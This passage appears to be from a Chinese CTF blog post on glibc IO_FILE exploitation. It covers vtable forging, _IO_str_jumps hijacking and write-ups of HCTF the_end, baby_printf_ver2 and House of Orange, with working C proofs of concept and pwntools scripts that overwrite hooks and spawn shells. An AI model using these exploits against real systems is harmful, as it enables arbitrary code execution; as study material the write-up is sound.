((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;</code></pre><p>伪造 <code>_IO_list_all</code> 和 <code>vtable</code>，最后 <code>exit</code> 时会 Call 到构造的 <code>_IO_overflow</code> 上：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define write_ptr_offset 0x28#define write_base_offset 0x20#define vtable_offset 0xd8#define one_gadget 0x7ffff7a0d000+0xf02a4int main() {    void *ptr, *fake_vtable;    uint64_t *list_all_ptr;    ptr = malloc(0x200);    fake_vtable = (uint64_t)ptr + 0x100;    *(uint64_t *)((uint64_t)ptr + mode_offset) = 0;    *(uint64_t *)((uint64_t)ptr + write_ptr_offset) = 1;    *(uint64_t *)((uint64_t)ptr + write_base_offset) = 0;    *(uint64_t *)((uint64_t)ptr + vtable_offset) = (uint64_t)ptr + 0x100;    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget;    list_all_ptr = (uint64_t *)_IO_list_all;    list_all_ptr[0] = ptr;    exit(0);}</code></pre><h2 id="Attack-with-IO-FILE-gt-glibc-2-24"><a href="#Attack-with-IO-FILE-gt-glibc-2-24" class="headerlink" title="Attack with IO_FILE &gt;= glibc-2.24"></a>Attack with IO_FILE &gt;= glibc-2.24</h2><p>从 glibc-2.24 起，加入了针对 <code>_IO_FILE_plus-&gt;vtable</code> 的检查，在调用虚函数时会首先检查 vtable 地址的合法性。先验证 vtable 是否在 <code>_IO_vtable</code> 段中，如果满足条件就正常执行；否则调用 <code>_IO_vtable_check</code> 进一步检查。具体验证通过计算 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 的值 <code>section_length</code>，然后获取 vtable 到 <code>__start___libc_IO_vtables</code> 的偏移 <code>offset</code>，若 <code>offset</code> 大于等于 <code>section_length</code> 就会调用 <code>_IO_vtable_check</code>：</p><pre><code class="cpp">/* Check if unknown vtable pointers are permitted; otherwise,   terminate the process.  */void _IO_vtable_check (void) attribute_hidden;/* Perform vtable pointer validation.  If validation fails, terminate   the process.  */static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable){  /* Fast path: The vtable pointer is within the __libc_IO_vtables     section.  */  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;  const char *ptr = (const char *) vtable;  uintptr_t offset = ptr - __start___libc_IO_vtables;  if (__glibc_unlikely (offset &gt;= section_length))    /* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  */    _IO_vtable_check ();  return vtable;}</code></pre><p>在 <code>_IO_vtable_check</code> 中，会具体检查 vtable 是否合法：</p><pre><code class="cpp">void attribute_hidden_IO_vtable_check (void){#ifdef SHARED  /* Honor the compatibility flag.  */  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag == &amp;_IO_vtable_check)    return;  /* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  */  {    Dl_info di;    struct link_map *l;    if (!rtld_active ()        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))      return;  }#else /* !SHARED */  /* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  */  if (__dlopen != NULL)    return;#endif  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;);}</code></pre><h3 id="Exploit-with-FILENO"><a href="#Exploit-with-FILENO" class="headerlink" title="Exploit with FILENO"></a>Exploit with FILENO</h3><p>当 vtable 不能被利用了，那么就该想办法在 <code>_IO_FILE</code> 结构体找利用方法。<code>_IO_FILE</code> 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 <code>fwrite</code>、<code>fread</code> 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。因为进程中包含了系统默认的三个文件流 stdin、stdout、stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf、printf 一样可以进行利用。在 <code>_IO_FILE</code> 中 <code>_IO_buf_base</code> 表示操作的起始地址，<code>_IO_buf_end</code> 表示结束地址，通过控制这两个数据可以实现控制读写的操作：</p><pre><code class="cpp">struct _IO_FILE {  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;    /* Current read pointer */  char* _IO_read_end;    /* End of get area. */  char* _IO_read_base;    /* Start of putback+get area. */  char* _IO_write_base;    /* Start of put area. */  char* _IO_write_ptr;    /* Current put pointer. */  char* _IO_write_end;    /* End of put area. */  char* _IO_buf_base;    /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};</code></pre><p>在没有执行任何输出函数之前，<code>_IO_2_1_stdin_</code> 结构体如下：</p><pre><code>pwndbg&gt; p/x _IO_2_1_stdin_$1 = {  file = {    _flags = 0xfbad2088,    _IO_read_ptr = 0x0,    _IO_read_end = 0x0,    _IO_read_base = 0x0,    _IO_write_base = 0x0,    _IO_write_ptr = 0x0,    _IO_write_end = 0x0,    _IO_buf_base = 0x0,    _IO_buf_end = 0x0,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x0,    _fileno = 0x0,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = {0x0},    _lock = 0x7ffff7dd3790,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dd19c0,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0x0,    _unused2 = {0x0 &lt;repeats 20 times&gt;}  },  vtable = 0x7ffff7dd06e0}</code></pre><p>调用 <code>scanf</code> 之类的函数后可以看到 <code>_IO_read_ptr</code>、<code>_IO_read_base</code>、<code>_IO_read_end</code>、<code>_IO_buf_base</code>、<code>_IO_buf_end</code> 等域都被初始化。而且可以看出来初始化后的内存是在堆上分配的，可以看到输入的数据，且大小是 0x400 个字节，正好是 <code>_IO_buf_base</code> 到 <code>_IO_buf_end</code> 的大小：</p><pre><code>pwndbg&gt; p/x _IO_2_1_stdin_$2 = {  file = {    _flags = 0xfbad2288,    _IO_read_ptr = 0x602013,    _IO_read_end = 0x602014,    _IO_read_base = 0x602010,    _IO_write_base = 0x602010,    _IO_write_ptr = 0x602010,    _IO_write_end = 0x602010,    _IO_buf_base = 0x602010,    _IO_buf_end = 0x602410,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x0,    _fileno = 0x0,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = {0x0},    _lock = 0x7ffff7dd3790,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dd19c0,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0xffffffff,    _unused2 = {0x0 &lt;repeats 20 times&gt;}  },  vtable = 0x7ffff7dd06e0}pwndbg&gt; x/10gx 0x6020000x602000:    0x0000000000000000    0x00000000000004110x602010:    0x000000000a333231    0x00000000000000000x602020:    0x0000000000000000    0x00000000000000000x602030:    0x0000000000000000    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000000</code></pre><p>那么如果修改 <code>_IO_buf_base</code> 和 <code>_IO_buf_end</code> 到某个目标地址地址，就能修改掉目标地址的数据：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define _IO_2_1_stdin_addr 0x7ffff7dd18e0char buf[100] = &quot;This is the Original Buffer.&quot;;int main() {    char stack_buf[100];    void *fake_buf_base = (uint64_t)buf;    void *fake_buf_end = (uint64_t)buf + 100;    void *ptr = _IO_2_1_stdin_addr;    *(uint64_t *)((uint64_t)ptr + 0x38) = fake_buf_base;    *(uint64_t *)((uint64_t)ptr + 0x40) = fake_buf_end;    scanf(&quot;%s&quot;, stack_buf);    printf(&quot;%s\n&quot;, buf);    return 0;}</code></pre><h3 id="Hijack-IO-str-jumps（-lt-glibc-2-28）"><a href="#Hijack-IO-str-jumps（-lt-glibc-2-28）" class="headerlink" title="Hijack _IO_str_jumps（&lt;= glibc-2.28）"></a>Hijack <code>_IO_str_jumps</code>（&lt;= glibc-2.28）</h3><p>libc 中不仅仅只有 <code>_IO_file_jumps</code> 这个 vtable，还有一个叫做 <code>_IO_str_jumps</code>。而这个 vtable 不在 check 范围之内。如果我们能设置文件指针的 vtable 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数：</p><pre><code class="cpp">const struct _IO_jump_t _IO_str_jumps libio_vtable ={  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_str_finish),  JUMP_INIT(overflow, _IO_str_overflow),  JUMP_INIT(underflow, _IO_str_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_str_pbackfail),  JUMP_INIT(xsputn, _IO_default_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_str_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_default_setbuf),  JUMP_INIT(sync, _IO_default_sync),  JUMP_INIT(doallocate, _IO_default_doallocate),  JUMP_INIT(read, _IO_default_read),  JUMP_INIT(write, _IO_default_write),  JUMP_INIT(seek, _IO_default_seek),  JUMP_INIT(close, _IO_default_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)};</code></pre><h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps-&gt;overflow"></a><code>_IO_str_jumps-&gt;overflow</code></h4><p>在修改了 vtable 之后，可以劫持 <code>_IO_str_overflow</code> 来劫持程序流程：</p><pre><code class="cpp">int_IO_str_overflow (_IO_FILE *fp, int c){  int flush_only = c == EOF;  _IO_size_t pos;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)      return flush_only ? 0 : EOF;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))    {      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;    }  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))    {      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */    return EOF;      else    {      char *new_buf;      char *old_buf = fp-&gt;_IO_buf_base;      size_t old_blen = _IO_blen (fp);      _IO_size_t new_size = 2 * old_blen + 100;      if (new_size &lt; old_blen)        return EOF;      new_buf        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);      if (new_buf == NULL)        {          /*      __ferror(fp) = 1; */          return EOF;        }      if (old_buf)        {          memcpy (new_buf, old_buf, old_blen);          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);          /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */          fp-&gt;_IO_buf_base = NULL;        }      memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen);      _IO_setb (fp, new_buf, new_buf + new_size, 1);      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);      fp-&gt;_IO_write_base = new_buf;      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;    }    }  if (!flush_only)    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;  return c;}</code></pre><p>其中通过以下几个条件来绕过：</p><ol><li><code>fp-&gt;_flags &amp; _IO_NO_WRITES</code> 为假；<ul><li>构造 <code>_flags = 0</code>；</li></ul></li><li><code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_blen (fp) + flush_only</code> 为真（<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>）；<ul><li>构造 <code>_IO_write_base = 0</code>、<code>_IO_write_ptr = 0x7fffffffffffffff</code> 以及 <code>_IO_buf_end = (bin_sh_in_libc_addr - 100) / 2</code>（<code>&amp;&quot;/bin/sh&quot;</code> 需要是一个偶数）；</li></ul></li><li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；</li><li><code>2 * _IO_blen (fp) + 100</code> 不能为负数，且指向 <code>&quot;/bin/sh&quot;</code> 字符串对应的地址；</li><li><code>*((_IO_strfile *) fp)-&gt;_s._allocate_buffer</code>（<code>fp + 0xe0</code>）指向 system 地址。</li></ol><p>即最后执行下面这句语句：</p><pre><code class="cpp">      new_buf        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code></pre><p>测试代码如下（环境为 glibc-2.24）：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a4e000#define _IO_2_1_stdin_addr libc_base+0x3878c0#define _IO_str_jumps_addr libc_base+0x384500#define bin_sh_in_libc_addr libc_base+0x14fc3d#define system_addr libc_base+0x3c971int main() {    FILE *fp;    char *bin_sh_on_stack_addr = &quot;/bin/sh&quot;;    fp = _IO_2_1_stdin_addr;//fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    *(uint64_t *)((uint64_t)fp) = 0; // _flags    *(uint64_t *)((uint64_t)fp + 0x20) = 0; // _IO_write_base    *(uint64_t *)((uint64_t)fp + 0x28) = 0x7fffffffffffffff; // _IO_write_ptr    *(uint64_t *)((uint64_t)fp + 0x40) = ((uint64_t)bin_sh_on_stack_addr - 100) / 2; // _IO_buf_end    *(uint64_t *)((uint64_t)fp + 0xe0) = system_addr;    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable    exit(0);}</code></pre><h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps-&gt;finish"></a><code>_IO_str_jumps-&gt;finish</code></h4><p>同理在 <code>_IO_str_finish</code> 中也可以绕过：</p><pre><code class="cpp">void_IO_str_finish (_IO_FILE *fp, int dummy){  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);}</code></pre><p>绕过条件如下：</p><ol><li><code>fp-&gt;_IO_buf_base</code> 不为空；</li><li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；<ul><li>构造 <code>_flags = 0</code>、<code>_IO_buf_base = bin_sh_in_libc_addr</code>；</li></ul></li><li><code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>（<code>fp + 0xe8</code>）指向 system 地址。</li></ol><p>测试代码如下（环境为 glibc-2.24）：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define libc_base 0x7ffff7a4e000#define _IO_2_1_stdin_addr libc_base+0x3878c0#define _IO_str_jumps_addr libc_base+0x384500#define bin_sh_in_libc_addr libc_base+0x14fc3d#define system_addr libc_base+0x3c971int main() {    FILE *fp;    fp = _IO_2_1_stdin_addr;//fopen(&quot;1.txt&quot;, &quot;rw&quot;);    if (!fp) {        printf(&quot;file not existed.\n&quot;);        exit(-1);    }    *(uint64_t *)((uint64_t)fp) = 0; // _flags    *(uint64_t *)((uint64_t)fp + 0x38) = bin_sh_in_libc_addr; // _IO_buf_base    *(uint64_t *)((uint64_t)fp + 0xe8) = system_addr;    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable    fclose(fp);    return 0;}</code></pre><h1 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018-HCTF-the_end"></a>2018-HCTF-the_end</h1><p>程序除了 Canary 其他保护全开了。一开始给了 libc 基址，然后可以改 5 个字节，最后 exit 退出：</p><pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  signed int i; // [rsp+4h] [rbp-Ch]  void *buf; // [rsp+8h] [rbp-8h]  sleep(0);  printf(&quot;here is a gift %p, good luck ;)\n&quot;, &amp;sleep);  fflush(_bss_start);  close(1);  close(2);  for ( i = 0; i &lt;= 4; ++i )  {    read(0, &amp;buf, 8uLL);    read(0, buf, 1uLL);  }  exit(1337);}</code></pre><p>因为最后的 exit 会调用到 vtable 中的 setbuf，所以只需要改这个指针就行。方法就是找一个假的 vtable，然后在把对应偏移处的地址改为 one_gadget。又因为只能修改 5 个字节，3 个字节用来修改 one_gadget，2 个字节来改 vtable，所以假的 vtable 原始的高 6 字节要跟原来的一样，而对应的 setbuf 偏移处的值得是一个 libc 上的地址：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./the_end&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]p.recvuntil(&#39;here is a gift &#39;)libc_base = int(p.recv(14)[2:], 16) - libc.symbols[&#39;sleep&#39;]info(&#39;libc_base = &#39; + hex(libc_base))exit = libc_base + libc.symbols[&#39;exit&#39;]one_gadget = libc_base + one_gadgets[1]vtable = libc_base + libc.symbols[&#39;stderr&#39;] - 8info(&#39;vtable = &#39; + hex(vtable))fake_vtable = libc_base + 0x3c5588fake_setbuf = fake_vtable + 0x58#gdb.attach(p)p.recvuntil(&#39;, good luck ;)&#39;)for i in range(2):    p.send(p64(vtable + i))    p.send(p64(fake_vtable)[i])for i in range(3):    p.send(p64(fake_setbuf + i))    p.send(p64(one_gadget)[i])info(&#39;one_gadget = &#39; + hex(one_gadget))p.sendline(&#39;exec /bin/sh 1&gt;&amp;0&#39;)p.interactive()</code></pre><h1 id="2018-HCTF-baby-printf-ver2"><a href="#2018-HCTF-baby-printf-ver2" class="headerlink" title="2018-HCTF-baby_printf_ver2"></a>2018-HCTF-baby_printf_ver2</h1><p>程序除了 Canary 其他保护全开。一开始会提供一个 buffer 的指针。然后往 buffer 上读数据。最后会检查 stdout 的 <code>_flags</code> 字段是否被修改，如果被改了就会再被改回来。最后输出 buffer 中的值：</p><pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  __int64 v3; // r13  FILE *v4; // r14  char buf; // [rsp+3h] [rbp-35h]  int i; // [rsp+4h] [rbp-34h]  unsigned __int64 v7; // [rsp+8h] [rbp-30h]  v7 = __readfsqword(0x28u);  setbuf(stdout, 0LL);  puts(&quot;Welcome to babyprintf_v2.0&quot;);  puts(&quot;heap is too dangrous for printf :(&quot;);  __printf_chk(1LL, (__int64)&quot;So I change the buffer location to %p\n&quot;, (__int64)buffer);  puts(&quot;Have fun!&quot;);  v3 = *(_QWORD *)&amp;stdout[1]._flags;  while ( 1 )  {    i = 0;    while ( 1 )    {      read(0, &amp;buf, 1uLL);      buffer[i] = buf;      if ( buffer[i] == &#39;\n&#39; )        break;      if ( ++i &gt; 0x1ff )        goto LABEL_6;    }    buffer[i] = 0;LABEL_6:    v4 = stdout;    if ( *(_QWORD *)&amp;stdout[1]._flags != v3 )    {      write(1, &quot;rewrite vtable is not permitted!\n&quot;, 0x21uLL);      *(_QWORD *)&amp;v4[1]._flags = v3;    }    __printf_chk(1LL, (__int64)buffer, 0xdeadbeefuLL);  }}</code></pre><p>经过调试发现 buffer 就在 stdout 的前 0x10 的位置。虽然不能修改原来的 stdout，但是我们可以覆盖 stdout 的指针，创建一个新的 stdout 结构体。在调试的时候获取相关的一些结构体成员：</p><pre><code>pwndbg&gt; p/x _IO_2_1_stdout_$1 = {  file = {    _flags = 0xfbad2887,    _IO_read_ptr = 0x7ffff7dd26a3,    _IO_read_end = 0x7ffff7dd26a3,    _IO_read_base = 0x7ffff7dd26a3,    _IO_write_base = 0x7ffff7dd26a3,    _IO_write_ptr = 0x7ffff7dd26a3,    _IO_write_end = 0x7ffff7dd26a3,    _IO_buf_base = 0x7ffff7dd26a3,    _IO_buf_end = 0x7ffff7dd26a4,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x7ffff7dd18e0,    _fileno = 0x1,    _flags2 = 0x0,    _old_offset = 0xffffffffffffffff,    _cur_column = 0x0,    _vtable_offset = 0x0,    _shortbuf = {0xa},    _lock = 0x7ffff7dd3780,    _offset = 0xffffffffffffffff,    _codecvt = 0x0,    _wide_data = 0x7ffff7dd17a0,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0x0,    _mode = 0xffffffff,    _unused2 = {0x0 &lt;repeats 20 times&gt;}  },  vtable = 0x7ffff7dd06e0}</code></pre><p>伪造 stdout 中的成员泄漏 vtable 来获取 libc，然后把 malloc_hook 改成 one_gadget，最后想办法在最后的 printf_chk 处触发 malloc。利用 <a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#FILE-py-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0%E6%A8%A1%E5%9D%97" target="_blank" rel="noopener">veritas501 写的 FILE 模块</a>来构造 <code>_IO_FILE</code> 结构体：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from FILE import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./babyprintf&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)p.recvuntil(&#39;So I change the buffer location to &#39;)buffer_addr = int(p.recvuntil(&#39;\n&#39;, drop=True)[2:], 16)binary_base = buffer_addr - 0x202010info(&#39;buffer_addr = &#39; + hex(buffer_addr))p.recvuntil(&#39;Have fun!\n&#39;)def leak(addr):    fake_file = IO_FILE_plus_struct()    fake_file._flags = 0x00000000fbad2887    fake_file._IO_read_end = addr    fake_file._IO_write_base = addr    fake_file._IO_write_ptr = addr + 8    fake_file._fileno = 1    fake_file._lock = buffer_addr + 0x100    payload = &#39;A&#39; * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]    p.sendline(payload)    p.recvline()    return u64(p.recv(8))def write(addr, data):    while data != 0:        fake_file = IO_FILE_plus_struct()        fake_file._flags = 0x00000000fbad2887        fake_file._IO_read_end = buffer_addr        fake_file._IO_buf_base = addr        fake_file._fileno = 1        fake_file._lock = buffer_addr + 0x100        payload = &#39;A&#39; * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]        p.sendline(payload)        p.sendline(chr(data &amp; 0xff))        addr += 1        data &gt;&gt;= 8vtable_addr = buffer_addr + 0xf8libc_base = leak(vtable_addr) - libc.symbols[&#39;_IO_file_jumps&#39;]info(&#39;libc_base = &#39; + hex(libc_base))malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadgets[1]#gdb.attach(p)write(malloc_hook, one_gadget)p.sendline(&#39;%66666c&#39;)p.recvuntil(&#39;\x7f&#39;)p.interactive()</code></pre><h1 id="2016-HITCON-houseoforange"><a href="#2016-HITCON-houseoforange" class="headerlink" title="2016-HITCON-houseoforange"></a>2016-HITCON-houseoforange</h1><p>通过 sysmalloc 构造 Free Chunk 的过程不过多叙述，主要是记录 IO_FILE 的利用。程序保护全开，流程大概如下。有建 House、升级 House、查看 House 三个功能：</p><pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  signed int c; // eax  sub_1218();  while ( 1 )  {    while ( 1 )    {      menu();      c = read_int();      if ( c != 2 )        break;      see();    }    if ( c &gt; 2 )    {      if ( c == 3 )      {        upgrade();      }      else      {        if ( c == 4 )        {          puts(&quot;give up&quot;);          exit(0);        }LABEL_14:        puts(&quot;Invalid choice&quot;);      }    }    else    {      if ( c != 1 )        goto LABEL_14;      build();    }  }}</code></pre><p>涉及到的结构体有 House 还有 Orange：</p><pre><code class="cpp">struct orange {  int price;  int color;};struct house {  struct orange *org;  char *name;};</code></pre><p>各个函数中大概是只能 Build 三次，每次只能 Upgrade 两次。其中在 Upgrade 时是重新输入 Name 的长度来读取，且只要小于 0x1000 就行，所以有 Heap Overflow：</p><pre><code class="cpp">int upgrade(){  struct orange *org; // rbx  unsigned int len; // [rsp+8h] [rbp-18h]  signed int color_id; // [rsp+Ch] [rbp-14h]  if ( times &gt; 2u )    return puts(&quot;You can&#39;t upgrade more&quot;);  if ( !houses )    return puts(&quot;No such house !&quot;);  printf(&quot;Length of name :&quot;);  len = read_int();  if ( len &gt; 0x1000 )    len = 0x1000;  printf(&quot;Name:&quot;);  read_buf(houses-&gt;name, len);  printf(&quot;Price of Orange: &quot;, len);  org = houses-&gt;org;  org-&gt;price = read_int();  color_menu();  printf(&quot;Color of Orange: &quot;);  color_id = read_int();  if ( color_id != 0xDDAA &amp;&amp; (color_id &lt;= 0 || color_id &gt; 7) )  {    puts(&quot;No such color&quot;);    exit(1);  }  if ( color_id == 0xDDAA )    houses-&gt;org-&gt;color = 0xDDAA;  else    houses-&gt;org-&gt;color = color_id + 30;  ++times;  return puts(&quot;Finish&quot;);}</code></pre><p>其中读 Name 时，用 read 来读，不会给 buf 后面补 0，所以可以泄漏出后面的内容：</p><pre><code class="cpp">ssize_t __fastcall read_buf(void *buf, unsigned int len){  ssize_t result; // rax  result = read(0, buf, len);  if ( (signed int)result &gt; 0 )    return result;  puts(&quot;read error&quot;);  exit(1);  return result;}</code></pre><p>然后这里利用 IO_FILE 的思路大概如下，利用 Unsortedbin Attack 的特性，下次 malloc 的时候，程序会调用 <code>malloc_printeer</code> 输出错误信息，最终一层层调用到 vtable 中的 <code>_IO_overflow_t</code>：</p><pre><code> +--------------------+ | malloc_printerr    | +--------------------+            |            v +--------------------+ | __libc_message     | +--------------------+            |            v +--------------------+ | abort              | +--------------------+            |            v +--------------------+ | _IO_flush_all_lockp| +--------------------+            |            v +--------------------+ | _IO_overflow_t     | +--------------------+</code></pre><p>在 <code>_IO_flush_all_lockp</code> 中，最终我们要执行 <code>_IO_OVERFLOW (fp, EOF)</code>，故要构造好 vtable 来改掉 <code>_IO_OVERFLOW</code>。前面的条件判断部分用 <code>||</code> 分为两部分，满足任一即可，（这里是 libc-2.23，根据前面 libc-2.24 及以后的版本的 IO_FILE 利用可以得出相应的 House-of-Orange 的做法）：</p><pre><code class="cpp">int_IO_flush_all_lockp (int do_lock){  int result = 0;  struct _IO_FILE *fp;  int last_stamp;#ifdef _IO_MTSAFE_IO  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);  if (do_lock)    _IO_lock_lock (list_all_lock);#endif  last_stamp = _IO_list_all_stamp;  fp = (_IO_FILE *) _IO_list_all;  while (fp != NULL)    {      run_fp = fp;      if (do_lock)    _IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T       || (_IO_vtable_offset (fp) == 0           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif       )      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)    result = EOF;      if (do_lock)    _IO_funlockfile (fp);      run_fp = NULL;      if (last_stamp != _IO_list_all_stamp)    {      /* Something was added to the list.  Start all over again.  */      fp = (_IO_FILE *) _IO_list_all;      last_stamp = _IO_list_all_stamp;    }      else    fp = fp-&gt;_chain;    }#ifdef 